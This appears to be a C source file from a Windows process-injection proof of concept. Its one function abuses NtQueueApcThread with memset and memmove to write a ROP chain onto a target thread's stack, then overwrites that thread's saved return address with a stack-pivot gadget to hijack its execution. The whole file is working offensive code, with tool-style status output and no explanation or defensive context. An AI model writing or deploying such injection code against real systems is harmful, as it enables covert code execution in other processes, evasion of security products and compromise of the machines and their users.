#include <windows.h>
#include <winternl.h>
#include <stdio.h>

typedef NTSTATUS(NTAPI* NtQueueApcThread_t)(
    _In_ HANDLE ThreadHandle,
    _In_ PVOID ApcRoutine,
    _In_ PVOID ApcRoutineContext OPTIONAL,
    _In_ PVOID ApcStatusBlock OPTIONAL,
    _In_ LONG ApcReserved OPTIONAL
);

typedef struct {
    DWORD64 orig_tos;
    DWORD64 tos;
    DWORD64 saved_return_address;
    DWORD64 GADGET_pivot;
    DWORD64 rop_pos;
} RuntimeParams;

int WritePayload(HANDLE hThread, DWORD64* ROP_chain, RuntimeParams* params)
{
    HMODULE ntdll = GetModuleHandleA("ntdll");
    if (!ntdll) {
        printf("[-] Failed to get ntdll handle\n");
        return 0;
    }

    NtQueueApcThread_t NtQueueApcThread = (NtQueueApcThread_t)GetProcAddress(ntdll, "NtQueueApcThread");
    if (!NtQueueApcThread) {
        printf("[-] Failed to get NtQueueApcThread address\n");
        return 0;
    }

    DWORD64 orig_tos = params->orig_tos;
    DWORD64 tos = params->tos;
    DWORD64 rop_pos = params->rop_pos;
    DWORD64 saved_return_address = params->saved_return_address;
    DWORD64 GADGET_pivot = params->GADGET_pivot;

    printf("[*] Writing ROP chain to stack using NtQueueApcThread...\n");
    printf("    Original RSP: 0x%llx\n", orig_tos);
    printf("    New stack:    0x%llx\n", tos);
    printf("    ROP entries:  %lld\n", rop_pos);

    // Write the new stack byte by byte using NtQueueApcThread + memset
    for (int i = 0; i < rop_pos * sizeof(DWORD64); i++) {
        NtQueueApcThread(hThread,
                        GetProcAddress(ntdll, "memset"),
                        (void*)(tos + i),
                        (void*)(*(((BYTE*)ROP_chain) + i)),
                        1);
    }

    // Save the original return address into the new stack
    NtQueueApcThread(hThread,
                    GetProcAddress(ntdll, "memmove"),
                    (void*)(ROP_chain[saved_return_address]),
                    (void*)orig_tos,
                    8);

    // Overwrite the original return address with GADGET_pivot
    for (int i = 0; i < sizeof(DWORD64); i++) {
        NtQueueApcThread(hThread,
                        GetProcAddress(ntdll, "memset"),
                        (void*)(orig_tos + i),
                        (void*)(((BYTE*)&GADGET_pivot)[i]),
                        1);
    }

    // Overwrite RSP+8 with the new tos address (shadow stack)
    for (int i = 0; i < sizeof(DWORD64); i++) {
        NtQueueApcThread(hThread,
                        GetProcAddress(ntdll, "memset"),
                        (void*)(orig_tos + 8 + i),
                        (void*)(((BYTE*)&tos)[i]),
                        1);
    }

    printf("[+] Stack written successfully\n");
    return 1;
}
